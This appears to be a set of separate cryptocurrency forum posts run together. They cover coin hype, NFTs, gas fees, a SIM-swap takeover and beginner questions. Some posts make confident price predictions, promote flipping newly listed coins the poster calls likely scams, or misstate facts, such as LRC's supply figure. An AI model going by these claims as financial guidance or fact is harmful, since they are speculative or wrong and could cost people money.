I see so many questions arise on posts about what people believe the next best cryptocurrency to invest in is. This post is a little different by the fact that I suggest you use this cryptocurrency and you don't necessarily have to invest in it. It is only about 2.5% of my total portfolio, but I do have full faith that is has the greatest potential.

That crypto is **Gitcoin** ($GTC).

GTC itself is a governance token to vote on changes done to https://gitcoin.co/. A cryptocurrency equivalent to the popular https://github.com website. If you are unfamiliar with github, it is a website used as a collaboration platform between software developers. It had 44 million users in 2019 and has since grown to 56 million users.

Gitcoin is interesting by the fact that is has multiple use-cases ranging from earning money like a Freelancer, learning software development through little minigames/tutorials/community, working with other members on open source projects, and a kickstarter-like funding program.

#Earn
The earning tab is a place where you will find jobs/bounties posted by different members for their own crypto project, web3 development, and more. In order to see the bounties you must login through github, but here is the link:

https://gitcoin.co/earn

I remember seeing many Harmony ($ONE) bounties posted and those may be part of the roadmap on Harmony's website.

Here's a step by step on how to begin earning money through freelance work:

1. Login to gitcoin.co and navigate to the bounty board through Earn

2. Select a bounty that you find interest in and read the given description of the problem and what the poster wants to see as a result.

3. If the bounty has workers auto approved you can express your interest and begin work, otherwise you post on the bounty that you're interested and you give a description as to how you will accomplish the given task.

4. On submission of the task and if completed successfully you will receive payment in whatever the bounty lists. This ranges from stablecoins to BTC, ETH, etc.

Not only is there freelance bounties but also hackathons that you can participate in to win money. This also plays in with the Learn portion below.
#Learn
Few ways to learn on https://gitcoin.co/learn. You can go the hackathon route, which lets you explore old hackathons, current hackathons, and upcoming hackathons. 

Following the hackathons, you can find yourself the opportunity to join Kernel. Kernel is an educational community where you can apply to join the course to learn or you can simply view the material from the course and learn on your own.

Afterwards, comes the little minigames or timed quests where you can learn about web3 and earn rewards. Summed up, quests are ways to learn through gaming and earning.

#Connect
This tab basically describes more about the Kernel program opportunity alongside connecting with peers through hackathons.

https://gitcoin.co/connect

#Fund

Lastly, we have the "kickstarter" of software development. By exploring the grants tab, you are able to supply grants/donations to different open source projects. I believe there is also another place to pledge some money to gitcoin to help with public goods projects.

https://gitcoin.co/fund

#Summary
All in all, I think it is important for people to take notice in cryptocurrencies that you don't even have to purchase in order for them to have a use. I have seen multiple occasions where GTC has great growth but Coinbase does not show that on their biggest gainers tab. I think this project is fairly unknown to the public and I just wanted to make it more known as the Rank 392 out of the top 500 cryptos.

Thank you, and the obligatory this is not financial advice it is only information I'm providing to you. Financially, I suggest you explore the learning tab for free and then heading over to the bounties tab and checking out some of the projects you could partake in.

I'm interested in making sizable crypto investments of 25k+ and all the exchanges I currently use have me governed to a daily or weekly limit of a couple thousand. 
I am looking for advice or referrals of service on how to make one-time 6-7 figure crypto purchases.
I am not Canadian or American so exchanges in these 2 Countries do not accept my Articles of Incorporation for my Company funds. Because I am a Resident offshore, I do believe I am restricted to Exchanges that operate out of tax free Countries. 
Wire capabilities are easily done but I need to put funds through from my Corporate bank account and most exchanges have a warning that they will return a wire if not received from account of same name.
Most exchanges are so automated that you cant get a live voice or a support number.
Is there such thing as crypto brokers and if so, is it legitimate?

Hi there, 

Total noob here so no hate. Seems like this NFT trend is getting huge and I feel like its early enough to get on this train.

My question is how do I invest into it? I heard about Loopring since its all over this subreddit recently, but are there more companies who are focusing on NFTs?

Also, does the same principle of HODL apply to NFT as well? Like, can I buy some NFT that can be worth more later?
 -
Since I need the 500 character limit, Id also like to talk about Peanut Butter vs Nutella debate. While Nutella is undoubtedly more delicious, its also a lot more unhealthy and isnt as versatile as far as different things it can be put in (mostly just baking). PB, on the other hand, is way more healthy and can be used in a variety of recipes such as cookies, smoothies, sandwiches and many more.

Thanks.

Hello everyone,

I am currently working on educating myself (DYOR) on various Crypto topics, this world is really fascinating.

Doing so, i try to multiply as much as i can my sources of information, and this include obviously some social medias. Mainly Reddit, discord and Youtube of course.

I believe it is important to challenge the impartiality of all those contents creators, and some YouTube channels with thousands of followers appear to me as clearly on the side: *"i have paid to tell you that XXXcoin is going to moon, buy now"*...

&amp;#x200B;

I just wonder what is your strategy to keep your head cool and try to get an unbiased and accurate information on crypto?

&amp;#x200B;

I subscribed to CoinBureau, and  Benjamin Cowen...

&amp;#x200B;

If this is a recurring question, my apologies!

If you visit https://nft.gamestop.com/ you can see a wallet address from GameStop, this has been here since the launch of this additional domain. 

0x13374200c29C757FDCc72F15Da98fb94f286d71e

If you search that address in the zkRollup explorer from Loopring https://explorer.loopring.io You can see transactions dating back to only October, 20, 2021 and as recent has 2.25 days ago.

On top of this LRC token of course has taken off, was around #176 on coin market cap this weekend and has risen to #69 today, nearing its precious all time high from 2017 of $2.59. Some other interesting findings not yet announced can be found in r/loopringorg

This time last year Ethereum was In the 300$ range and now its smashing back to back ATH in under a week and hit 4600 this evening . Thats some incredibly impressive growth in 12 short months. 

For anyone that bought when it was under 500-1000$; congrats thats some amazing  ROI. I got in at the summer dip around 1700 and Im really stoked I did. 

A few months back I went mostly all in and converted most my alts to ETH and most people I talked to said I was putting all my eggs in one basket etc but I felt confident in my choice and Im not regretting it now 

Most the news is geared toward big daddy Bitcoin and how its exploded over the years and its amazing gains this year, but I think ETHEREUM has done just as well and its got a lot more room to grow. 

ETH 7-8k end of year

Everyone saying Squid Game coin was obvious scam but after dogcoin boom there are so many dog based coin like SHIB,ELON,FLOKI . Shib gave many fold return and still trading on exchange despite no real use.

Don't you think if Squid Game coin was properly launch (with no scam but just like shit coin) it could not have given many fold return to early holder due to show popularity ?

:what I think is most of the people are investing in shit coin with mentality of gambling and expecting 10, 20 ,100x return and in future we will see more and more coin like this.

I've been bullish on Solana for some time, and I've seen it rising for most of the year. In my opinion, it is the most undervalued crypto, and I believe it stands to rise quickly over the next few weeks. 

A few weeks ago, it flipped Ripple (XRP) for total marketcap. Today, it reached 5th, and is only $1bn from taking 4th spot. ([source:](https://coinmarketcap.com/) This is sure to change again by the time I post this).

https://preview.redd.it/9twe4kqscax71.png?width=2794&amp;format=png&amp;auto=webp&amp;s=7d8f9fd252300093bf3df80e74f161c216b06bc3

Solana's success is  not a reflection on the other coins. I actually hold small bags of Ripple and Cardano, because they're also good projects and they're till good value. However the scale of Solana adoption is enormous, it is one of the biggest influences on the rise by developers. The insanely fast speeds and near zero fees have made it a lucrative option for the development of a number of projects, and it is still growing. If you're unsure, do your own research. But I suggest you start by getting a phantom wallet, and making a few Solana transactions. You will be amazed by the speed and cost of these transactions, especially when you compare them against Ethereum or Binance chain. 

You may not have noticed the steady climb among the meme coin phenomenon, but I don't believe it is very likely that those coins will hold their positions for very long. They'll drop back out of the top ten again. Now that the memes are losing steam, you'll have to revert back to reliable projects. Good luck in whichever coin(s) you are backing!

After today's rally in the price of ETH, the market cap has climbed to an extraordinary $543 billion. With the market cap of BTC currently sitting at $1.193 Trillion, ETH has an MC equivalent to 44.76% of BTC.

If the current sustained continued as ETH moves forward as a deflationary coin, there is a very good chance that it will pass the symbolic 50% mark, depending on how hard BTC pumps between now and EOY.

Either way, that 50% is inevitable and it's at that point that the FOMO will kick in and push ETH to even greater heights - towards $15K.

The idea of Ethereum having a market cap of 50% the market cap of BTC seemed a long way away just a year ago, but if the current rate of growth continues nfor both ETH and BTC, it's likely they will achieve parity before 2030. Possibly even a lot sooner than 2030.

For everyone holding ETH, rejoice. Every single one of you will eventually be rich as fuck.

Congrats to all the holders!

A lot of people were hating on Solana. And I am sure they will keep on hating on it.

Not bad for a centralized peace of crap right?

There is a huge amount of development going on and they have the funding.

Imo they do got to work on being less centralized. But things take time and they will fix those issues.

With the breakpoint conference on Nov 7th we might even see more hype coming in.

Here is a link with a countdown : [https://conference.solana.com/](https://conference.solana.com/) and they will be streaming it on twitter!

Really bullish on Solana. Up to new ATH's !

Try not to fomo though. Fear and greed index is already on extreme greed. All the alt coins seem to be popping off.

Ive been doing a lot of research on metaverse to try and capitalize on some good projects in the gaming, NFT, and all of what it has to offer in that space. 

I came across CUBE (somnium space). So I did some research on this project. This isnt Finacial advise at all. The research I came across is it has a high potential and current low market cap along with limited coins. Plus the ranking is very low with this coin. Its been going up huge along with MANA and SAND. 

The only place I seen where you can buy it on is on Gemini. 

Anyones thoughts or anyone else holding? 
*disclaimer* I bought today and Im a holder of this coin.

This is my first crypto cycle and I have studied a lot for the last few months. With a lot of reading I have noticed there are different prediction models which predict the prices of crypto. 

But the most interesting thing I have noticed is that there is a certain pattern that gets followed in the crypto world. Something like Bitcoin pumps then the mid cap alts and then eventually the small cap alts. There is so sort of similar pattern that occurs when the bear market starts.

Now assuming this is the start of bull cycle and we will also see the next bear cycle after this (unpopular opinion), it would be helpful if we discuss the best patterns to look for. It can be a famous model like Plan B or just your won developed pattern. But it would be very helpful for everyone to understand the crypto cycle from others perspective.

Some of you might remember that Sunday night my phone got Sim swapped. My first clue was a notification from Yahoo saying that I had signed in from the state of Utah. I live in Alabama. After that I tried to text someone and when it didn't go through I tried to call someone and it didn't go through. Fortunately I was on Wi-Fi so my email was still working. They went in through my Yahoo email which is the one that goes with my coinbase account. They went into my coinbase account and changed my password. I spent a couple of hours on the phone with my carrier on Sunday night another couple of hours Monday night and about 40 minutes or so on the phone with them today. As of right now it looks like it's still going to be at least 3 days before I can get my number back, making 5 days total. As of right now I'm not aware of any of my other accounts being compromised. All of my hot wallets are safe. I went to Walmart and bought another phone this afternoon and have been loading everything back on to it checking everything and going to the accounts that I can get in. As of right now I still cannot get into coinbase and their automated responses are a pain in the ass, I'm also trying to get into Gemini so that I can change my information even though I haven't used Gemini much over the last year and don't have any money sitting on it. I can't even get into it because the verification goes to the phone number that was stolen. Fortunately I only have about $45 in zcash sitting on coinbase and they probably have it locked down at the moment. At the rate it's going it's going to take a year to get back in there. 
What did I do wrong? I can't see anything I did wrong. I don't have very many contacts in my phone very few people have my number, except a few websites. There's no malware on my phone. I have not heard of a single case of sim swap that did not involve coinbase... 
I hope this helps somebody.

Crypto newbie, just throwing $ at shit to see what sticks. I made a wallet on Meta Mask, but can not no way find a way to fund it. Every way I have to access my $ gets declined when I try to buy ETH on Meta Mask (bank account, debit card). I even chatted the bank and they confirmed its being authorized on their end. Why Meta Mask declining me? 

I FOMO created accounts on Coinbase and EToro which are both currently letting me buy. I did this bc I thought I could then send my coin to the MetaMask wallet? Am I right? Wrong? Wut do?

I can't get over this subreddit sometimes and how it thrusts the biggest jackasses in crypto to the frontpage with their words of wisdom that ultimately turn out to be complete nonsensical garbage.  Some clown was on the frontpage a few weeks back after SOL had hit it's ATH and was on a decline.  I remember, it's when it got to around $175 that this idiot came here to tell us all how anyone still in SOL are idiots and basically talked down to us like we were dirt but at the same time sold himself as some kind of guardian angel looking out for our financial best interest.

Here's something I've learned about these kinds of people: they usually are flippant and moody because they bet against whatever is going up.  I see it in stocks all the time. "Hey you big dumb idiot, you're invested in X? It's going to go down! Trust me, I'm looking out for you, big dumb idiot."  It's always the same contradictory tone.  Are you looking out for us or do you think we're idiots? Obviously it's all just to attack our ego and second guess our investments.

So yeah, SOL hit $230 tonight, and for all I know it could crash tomorrow, but that guy acting like $215 was it and everyone was stupid for holding, he can suck a fuck.

I just started crypto trading and have some troubles managing my wallets. I've been making all the necessary wallets here and there, and now I have more than 5 wallets. I googled that offline storage is the safest, so I wrote it down in a notepad, but in my opinion, online storage won't be damaged or lost, and it's convenient to take it out when you are outside or in a hurry. Wouldn't it be saver unless someone hacks or reach access to it? So my question is. Does anyone keep there seed phrase online? Please just don't say no I really want some actual experiences. Thanks for reading!

Hey guys fairly new to crypto but I stumbled upon this. Down 70 percent up a total of 700 percent from begining  has decent cap I believe just under 850 mil range. But don't know why it's sitting at six cents per share. Climbed a little today but looks like it's been pumped and dumped a few times. Went to the site and is described well with fast transactions and such but don't understand why it's sitting so low. Or why to me it looks like it was pumped and dumped. Also doesn't seem to have crazy plans for future. I could be wrong with that. however, I wanna here what you guys think about it maybe spread some knowledge to me about why it's at where it's at.

If someone comes a long and says I invested $10k in (whatever coin), that may sound like someone really believes  in that coin, but that may also be a very insignificant amount of money to them. I want to know what kind of risk people are taking. How much does this money mean to you? I think people are lost in dollar amounts. I see people here asking all the time Is it worth buying $100 of Bitcoin? I have no idea. What is $100 worth to you? If you believe BTC will double and $100 is your net worth, than youre going to double your net worth. 

How much you spend on a particular coin is largely irrelevant. You need to me focused on what percentage of your income that risk represents. Thats how you factor risk. Comparing your dollars to someone else can be completely meaningless if their net worth is drastically different than yours. I think it would be great if more people were saying I invested 5% of my monthly income into X. Thats much more of an indication of how they really feel about it.

 What would happen if someone bought the entirety of one crypto? say a coin had a max supply of 100million and someone bought all 100million of them, would it just never rise in value, or would it moon? If it would skyrocket, can someone please explain how the whole thing would work?  I am wondering this because if it would moon, couldn't I technically buy out a bunch of new small-cap cryptos and make a ton of money doing that? If anyone knows what would happen, please help me out, because I can't find any info about it on google

Noobie question. I'm trying to do research on projects and am looking at utility, tokenomics, and market cap to start. I couldn't think of the answer to the above question. Do all tokens need to have an intrisic store-of-value effect to them?

To use Algo as an example, if the fees are so low, then why would someone hold a lot of the token? Is this like asking why I would hold more USD than I spend? Or is it more fair to say why I would buy more gasoline than I plan to use? 

Any links to some beginner reading that you guys like would be helpful. Thanks!

The last time ETH reached ATH was back in May and now we are back to the sky!

Congratulation to all ETH holders who have held it through the consolidation of long and hurtful months. It sucks when you see other coins pumping but ETH stays where it is, but nothing hurts more than selling the coins you believe in to chase the coins that are pumping just to miss the pump of the coins you believe in. (been there done that)

Let's celebrate today and hope ETH can find footing above the previous ATH. To infinity and beyond!!

In 1907, the Knickerbocker panic spread rapidly across the nation, causing droves of people to run on banks and withdraw money. JP Morgan contributed his own money to help with liquidity and urged others to do the same. Within 6 years, the Federal Reserve act was signed (to the cheers of the general public) and it was portrayed as detrimental to financiers like Morgan, but all it has done has worked in their favour since that moment. Crypto has been heralded as the institution killer, but we dont know who the mysterious Satoshi Nakamoto is, most media coverage has been negative towards it, and slowly institutional investors are joining the party. Im wondering if the end result may once again favour the haves, rather than the have nots.

Hello crypto friends, 

So I'm in the process of designing a Dungeons and Dragons style play to earn fantasy game; in the game weapons, armor, loot, and even the characters themselves (that are rolled randomly with a percent chance of rare traits) will function as NFTs. With an in-game cryptocurrency given upon finishing quests as well as potentially rare loot. 

I know many crypto games suffer from a lack of playability, so I'd like to address this with a fantasy experience in which players can interact with each other, form guilds to take on tougher enemies, and level themselves up to fight more and more difficult foes. 

So my question is, does that sound like something worth playing to you guys? I have a write up on the idea complete with the class list, weapons and armor, levels, and enemies if any of you are interested in reading it; it would be semi open world with some barriers dependent upon character level. 

Any feedback is welcome!

The sub has really helped me become a better investor with strategies learned such as:

*Dca - in and out

*Holding - ice cold blood

*Consolidate - when opportunity arises

*Take profits - or don't

*Research - and more research

Everyone's happy now that most investors are in the green. 

But, what about when the real Bear market comes? Where there's doom and FUD all around. Stickied Suicide hotline post in this sub. The media, family, friends and investors screaming "I told you so!

To the Veterans who survived the bloodshed - What is the most important survival lesson that you can share to us who haven't experienced it yet?

Hello everyone! So I'm not sure if there is any correlation or if anyone has anyway to look into this deeper (would appreciate ideas on how this could be accomplished)  Does anyone think the Coinbase quiz rewards could be driving some of the second tier coin pumps?  I happened to notice that I had the option to do a Loopring reward and shortly after Loopring has been on an almost 300% run.. 

The latest loopring was 1.5$ (which is lower than what I have seen in the past) but if all coinbase users does the reward thats like an injection of 100 million into the coin.  Does anyone know if coinbase caps the amount they are willing to reward?  Haven't been able to find details about that but must admit haven't done a super thorough search and was more curious if any here had run across information.

Thanks in advance!

So I had the idealistic motivate to withdraw 25% of my SAND. Behold to the unknown the fees are $120  +..., sounds like the inflation over here in New Zealand, cheers Jacinda you old BAT.  


I assume latest mainstream interest on crypto prompts the ETH network to be super busy hence super high gas fees. I did checkout "[ETH Gas Station](https://legacy.ethgasstation.info/calculatorTxV.php)" and tried lowering  Gwei -166.

Any idea of where to find Level 2 exchangers to avoid these astronomical gas fees? Or Level 2 exchangers don't exist yet? 

Also is it confirmed that ETH 2.0 will start on 2024?

Ok guys,  I just came up on a Benjie. I just got a hundred dollar bill, what crypto should I be  buying right now with it?

Its time for you to shill me your favorite coins. How should I spend it? Do I diversify or just go all in on one coin? Im ready to make some money. Im relatively new to the crypto scene. Been trying to making money since March. Ive been dcaing into certain projects that I like and believe in. Theyre not mooning like these damn meme coins. But like I said Im ready to read what you guys would spend that 100 dollars on. Wish I had more money to play with but its all I got for this week. I know btc and eth should be a guarantee to make some profits. But open to other coins.

I saw a post saying there are over 9000 coins/tokens yet Im trying to find an exchange to use that has lots of options. My current one doesnt have a lot plus my wallet doesnt support them all. How many exchanges/wallets to have is average? Can I ask for recommendations on here or is it a rule not to? Every time I read reviews every exchange has the scam/they will take your money. I read and watch videos but I just am unsure. Maybe there is no answer to this but maybe someone can give me a genuine recommendation for an exchange and wallet for the U.S. ? thank you. And is there a counter for the 500 minimum text? I dont see one and may get kicked back.

Within reason what are your price targets and exit strategies?  If this is the bull market of bull markets .

Im new to investing in crypto and seeing 100% Or more gains in months not years so when should I start offloading.  

Ive been watching a shit ton of YouTube but    Have to take it with a grain of salt cause they are mostly pumpers and shillers.

So lets use this as a proving grounds to establish price targets for at least the too 20-30 coins  or whatever your into actually.

Thanks in advance!

So basically im fairly new to Crypto, I joined in June and i bought ADA and ETH because they were easy to "study" and they were big already and there's bunch of information everywhere about it. 

But what about other coins? That don't have that easy info, how do you look for it, what do you look for it, what do you check? Market Cap? Buy % vs Sell %? If its new or old? You just follow hype?

I would really appreciate if anyone could help me, this community has been big company to me in boring times and for that i thank you all.

title. 

(Now before any Eth maxi starts shitting on me, just FWIW Ethereum is my second largest bag and I'm not here to tell you "Eth is dying")

I just spent $40 (as well as a ten minute wait) just to allow Uniswap to approve a token to transact. Read that again, not even to perform a swap, but just to approve the token was $40. The swap was a further $200.

It's only palatable because I'm moving a comparatively large sum of money at the moment, so I guess I can justify that I'll likely make much more money (if my rotation is correct) than I spent here on the swap. But this would destroy me if I just wanted to pick up like a small amount of a newer coin. In fact I'll never really be able to do that again on Ethereum, so long as this is the situation.

"Layer 2s are the solution though!" Are they? I have seen screen shots of $30 fees on Arbitrum. That's *better* sure but why would I be on a chain that costs me ~$30 when I could be on one that costs cents? Cosmos transactions cost like .00025 ATOM. Solana is like .00001 SOL. Harmony  is like .000025 ONE. I could go on but you get it.

Again I'm not saying this to shit on Eth, I'm saying that as a retail crypto trader it is not financially viable for me to use the Ethereum ecosystem (for Defi, or NFTs, or whatever comes next) beyond just hodling ETH.  I have used ETH a fair bit in my short time in crypto, but I cannot see how I can continue to use it at these rates. I'm at the point where I'll just have to try make my money elsewhere (even this transaction I didn't want to do, but ETH is the only supported bridge for the chain I'm rotating into).

Maybe ETH 2 fixes this, genuinely I hope it does because Ethereum is a fucking *major* and I want it to thrive.

Are you collecting from all the faucets? Collecting nickels and dimes in CoinHunt World, playing CryptoRoyale in your spare time?

Maybe youre using Brave for BAT, watching ads and videos for crypto, making funny memes for some Banano tips, or shitposting for moons?

Whatever it is, if youre scraping everything you can from the sources available. But remember theres another way to collect crypto too: *budgeting!*

Maybe you can order the cheaper beer, or go to happy hour for value food and drinks. Maybe buy the value brand, or utilise coupons! 

Dont use that streaming service much at all anymore? Maybe you can get by with cutting it out of your monthly budget. Shop sales, meal plan instead of going out.

Theres many ways you can work in a new budget. 

And what you do with the money you saved? **Yolo that shit all into your favourite crypto!** 

You earned it. And those small budget decisions WILL add up. You can watch an ad for crypto, but you can drink Coors instead of that craft beer for *more* crypto than that - think about it!

For Example if I buy ETH - USD pair, can I only sell for USD? Or could I sell it for Euro? 


How do I sell crypto in different currencies?


If this is possible, having savings in crypto would be safer in the event of the collapse of the USD.

Hello everyone,

I'm looking into transitioning into cryptocurrency as a form make payments for my business. I just make payments tied to a debit card rather than a traditional bank account. I would like for in-person and online payments for my business to be accepted in cryptocurrency.

I live with the volatility. ETH, BTC, etc is fine. Any suggestions would be greatly appreciated.

This is the business Issue i'm trying to solve.

Customer arrives at business both physically or digitally and wants to pay with his card. I would like to accept his payment as cryptocurrency(BTC,ETC) automatically.

Thanks!

I'm sitting in a bar watching TV, and I feel like there's no people in the public talking about or paying attention to crypto right now.

In this bar, I'm watching the Baseball World Series. The ump for this game has an FTX patch on his shirt. Interesting, that's probably a decent investment to advertise like that.

Then the game cuts to commercial, it's Matt Damon in a crypto.com commercial. This is a lot of advertising investment. Is shit about to take off and the public hasn't realized it yet? I feel like no one's talking about it but I see the ads everywhere.

We see posts and advice all day that say HODL and 'to the moon' etc. So I got curious about the validity and numbers behind it.  Specifically, I was curious what $1000 invested in 2016 and 2019 would be worth. I choose the exact dates of 11/6/2016 and 1/6/2019 because that is about 5 years ago and about two and a half years ago, roughly.  I looked at the two big coins, BTC and ETH, and whatever the top three alts were on 11/6/2016 by market cap.  Those were XRP, LTC, and ETC. I also split the money 1/3 BTC, 1/3 ETC, and 1/3 equally in the alts.  I used this website to see prices: [https://coinmarketcap.com/historical/](https://coinmarketcap.com/historical/)

&amp;#x200B;

What I found is that if you had invested $1000, actually $999, on 1/6/2019 this way, it would now be worth $16,033.63.  And if you had invested that way on 11/6/2016 it would be worth $186,711.11.  Going by these numbers and divvying up by thirds method you would have to invest $6,230.90 on 1/6/2019 to have $100,000 and, obviously, invested $62,309 to have $1,000,000 today.  Alternatively, you would have had to invest $5,350.51 on 11/6/2016 to have it be worth $1,000,000 today.

&amp;#x200B;

I got rather down when I read the post earlier this week about how those who were only investing $100 were never going to be rich.  But a $100 on 1/6/2019 would be worth $1,604.90.  And $100 on 11/6/2016 would be worth $18,689.80.  Is that wealthy? Absolutely not. But it is a good return and absolutely worth the investment.

&amp;#x200B;

I don't want you to do anything with this information.  I find it to be interesting and a good perspective on the state of things.  I have to add that my numbers or math might be way off because it is late and my brain is fried.  So I am adding my little spreadsheet here at the end so people can check me.

&amp;#x200B;

I hope that this post gave you a bit of hope and maybe some good perspective. 

&amp;#x200B;

Hello fellow cryptonauts,

So a month or so ago I started playing Coin Hunt World on my phone. It's a fairly boring augmented reality game but with a little time you can get some free crypto every day. 

Essentially, you are collecting keys in the areas around you to open vaults around you. Once you open the vaults, you answer a trivia question and if you get it correctly you get either some BTC, or ETH. If you set the game on "hunter mode" and answer the question correctly quickly you will get ten cents worth.

I know this is definitely not a lot of money, but you can also build vaults. I have one outside my home I can use twice a day (it resets at 8am and 8pm) and one outside my work I can use once a day. It's only 30 cents a day, but that's $9 a month of free crytpo. Plus, there may be more you can get that just happen to be in places you are going anyway, like the grocery store or a park.

This will by no means make you rich, but I'm happy to add an extra $10-$15 a month t my crypto without making any special trips.

Side note: There are vaults that pay more, $1 and some even $10, but I'm not lucky enough to live enar any of those.

Ive tried and tired again, but dont think I will ever understand how NFTs can hold such wild values, what people do with them, and or anything else about them.  Some NFTs look like an icon made by a fifth grader.  It just can not grasp this concept.  But what I do know is Cat Buttholes in Space, and I think its time to merge the two ideas. Launching within the next month, Cat Butthole Productions will bring you the first collection in a line of many.  Our first collection will be Psychedelic Cat Buttholes in Space.  We estimate the value of each piece around 10 ETH, dont miss out.

Hello all, with the huge influx of new members, I believe it is important to summarize what is cryptocurrency is the shortest way possible. With so many experience members in this subcommunity, I believe we can give a short summary of what cryptocurrency is.

A huge welcome to all the members who heard about the new coin partnership with GME and I am glad that you are now expose to cryptocurrency as a whole.

Henceforth, in 1 sentence:

"cryptocurrency is completely digital, decentralized form of currency  can be used as a means of payment, or as a potential store of value."

So tell me what do you think cryptocurrency is?

Have you ever wanted to get paid in cryptocurrency for the work youve put in? Reddit gives you that ability in three different subreddits which are 
r/cryptocurrency (moons) 
r/fortnitebr (bricks) and r/ethtrader (donuts)

Every 28 days Reddit gives you some cryptocurrency for making posts/comments and accumulating karma. The amount you earn is depending on the ratio for that round all you need to do is open up your vault on Reddit mobile by clicking on your avatar in the top left corner and following the steps on screen

**Write down your seed phrase (12 words Reddit gives you)**

Once you did that go back to the subreddit you wish to partake in and get to earning! 

Happy moon distribution day 
r/cryptocurrency :)

I've been reading a lot about more big companies starting to get into crypto lately, be it actual moves or speculation. Some examples I think of are:

* Some say [Canva should get into NFTs](https://financefeeds.com/canva-hottest-unicorn-grow-even-nfts/) too since Adobe Photoshop is [getting in the NFTs](https://www.theverge.com/2021/10/26/22745506/adobe-nft-art-theft-content-credentials-opensea-rarible-photoshop) with an upcoming feature. 
* Ubisoft is [getting into NFT/blockchain games](https://www.gameinformer.com/2021/11/01/ubisoft-reveals-plans-to-develop-blockchain-games-and-nfts), which makes sense given the popularity of metaverses lately. (lmao Axie)
* Visa is also [planning on crypto integration](https://usa.visa.com/solutions/crypto.html), which means trading between traditional currencies and crypto might get easier soon.
* Facebook is becoming Meta. There's that. 

I like reading about them, but I'm not sure how to feel as a holder. Should I be excited to stake on them soon or are they bad news?

Guess what? Youre still early. 

Congratulations to everyone that has stuck it out to see us continue to hit milestone after milestone. Remember the warmth these moments bring you, especially when the frigid cold of the bear market inevitably comes around. 

Remember the friendships you make in the daily. Sometimes its not about selling it all and riding off into the sunset, maybe the reward is the moments we get to share together, breaking ATHs and eating ramen. Theres beauty in the struggle. The pursuit of happiness is better with friends than to go alone. 


Congratulations to all of my friends. Heres to us continuing the pursuit of happiness, breaking ATHs, together.

Hi everyone long time lurker here and not getting much involved usually as I dont feel like having anything relevant to add on most post/topic. 
However noticed something that as lots of new people joining the sun and starting to invest in crypto should be aware of and start applying. 

Internet is a wonderful place and crypto a wonderful way of using your money, but keep in mind with all the recent hack happening and constantly happening on trading platform as weve seen where crypto been stolen from major company or account information being leaked. 

So here are my advice for everyone new to this : 

1. Create a different email address and password for each different trading platform you are using and make the password as difficult as possible even if you have to write it down on a piece of paper sticked somewhere at home this would be more safe than having it store anywhere else (feel like this been said many many times but cant been said enough) 

2. For every purchase you make on a platform using your main bank account or else please find a way to have a disposable card 
If your bank doesnt offer this service you can find lots of different app/website that offers it. 
 (I personally use Revolut for this. Great platform if your original currency isnt USD for conversion only downside you need to have a pay subscription in order to have those disposable cards but you can cancel the subscription anytime). 

3. Be careful regarding your investment dont fall for scam and dont disclose wildly your position with your entourage; even on Reddit. 

Thats for me the main 3 points that are for newbies that can seem like common sense for many but unfortunately is not.
Feel free to pitch in for additional tips for all the newcomers.

I am relatively new to BTC and have been watching a lot of Robert Breedlove. The idea behind bitcoin is fascinating and I am just about convinced that bitcoin is the ideal currency. The one flaw that I am seeing/failing to understand is that I would think that the "ideal currency" would be free to use. I saw something that the average BTC fee is 3-4ish dollars. How can  this be the currency of the future if I have to spend $3 in order to buy a coffee? And my understanding is that the more network traffic the higher the fees. Can someone explain to me why this will not be an issue in the future for bitcoin?

According to the source code on Loopring's GitHub site, the protocol's developers are planning to integrate with GameStop's much-touted NFT platform. As GMEdd pointed out, the code contains several intriguing references: "*The amended code in the branch NFT-DEV, under the GitHub commit titled NFT feature, makes reference to gameStopMeta and an IPFS URL."*

So, how exactly does a Loopring exchange operate in practice? Users deposit their funds to a smart contract governed by the Loopring protocol first. The associated deals are then batched together and matched for efficiency improvements, and user-identifying information is moved off-chain. Each batch of transactions is then put to the Ethereum blockchain using zero-knowledge proofs, allowing for a complete reconstruction of the off-chain transactions. Using this technology, Loopring claims to be able to process over 2,000 deals per second.

Decentralized exchange operators employ Loopring's native cryptocurrency, the LRC, to provide the required "lock-up capital." If the operator violates specific terms and restrictions, the locked-up LRC may be confiscated. Users that bet LRC get the right to 70% of the exchange costs, but 10% of these fees  paid in LRC  are burned, maintaining a deflationary environment overall. LRC's total quantity is limited to 1.395 million tokens.

&amp;#x200B;

TLDR;

LRC hasn't full run yet!

It's all about momentum pushes, low market cap coins being freshly listed on big exchanges. There's a rapid buying frenzy which takes place the first few minutes to couple of days and it's a pattern. 

Last night Dreams Quest had a Kucoin world premiere, opened at .24c and sold this morning at $1.70. The world premiere before that, Swash, climbed over first 12 hours for a x5. The premiere before that, sclp, did x5 in the first few minutes, then tanked down 50% from open price but climbed back to opening price and did 100% afterwards. The volatiliy is insane.

On Coinbase recently Jasmy just did 200%, ASM 100%. This strategy is not about the technology, it's not about fundamentals, it's about momentum. New coins releasing with low market caps so the price can run as the masses buy in, first time world premieres are even better. 

If you want a successful strategy that will work even in down markets, watch new coins being listed on Coinbase and Kucoin, and lock in profits early DO NOT get greedy consider 100% as massive growth. Do not hold these coins, many prob are scams, you just want to be there early and sell early. Diversify profits and take small positions. Not all will run but 50% loss or a x5 gain, risk to reward ratio is there.

Hello. I am trying to learn about consensus mechanisms and how they work, starting with PoW. Can someone please help explain this to me with layman's terms, and with non tech analogies if possible? What I am getting confused about with PoW is that I am reading that in a blockchain there are thousands of nodes competing to solve a mathematical problem, and the winner is the one who gets to verify the most recent block of the blockchain.

Firstly, I thought the one of the big ideas behind blockchain is that it's not just one computer or one organization verifying the accuracy of a ledger, and that it is instead thousands or millions of nodes all of which need to be an agreement as to the accuracy of the latest block in the ledger before verifying it. This is inconsistent with a single "winner" being the one to verify a ledger.

Also, what is this "mathematical" problem that all the nodes are trying to solve? Is it in anyway related to the transactions on the blockchain themselves? I heard once that the nodes are trying to find a new prime number, and, because prime numbers get rarer and rarer as you go higher up, the harder it becomes for computers to find them. The individual who told me this also told me that each bitcoin represents a prime number, and that's why bitcoins are scarce- because prime numbers, while infinite, become exponentially harder to find as you go higher up.

Thanks!

I just checked my crypto and noticed a coin in my wallet that I don't remember buying or ever seeing before, It seems suss but I've looked it up and it seems to be a legit coin. Should I be concerned? Has someone hacked me to buy me coins? Seems like a weird scam but I mean, thanks? Ease sir, may I have some more?
Or is it possible that a coin I bought has changed its name or something? 
It's called songbird and has a bird logo. 
Nothing is missing from my wallet but I'll change all my passwords anyway.
Thanks for reading. I'm also accepting any tips on which coins will make me super rich, super quick. 
Willing to invest upto $10, I'd like returns in the millions. (Just trying to get my post over 500 words so it's not deleted)

Hello

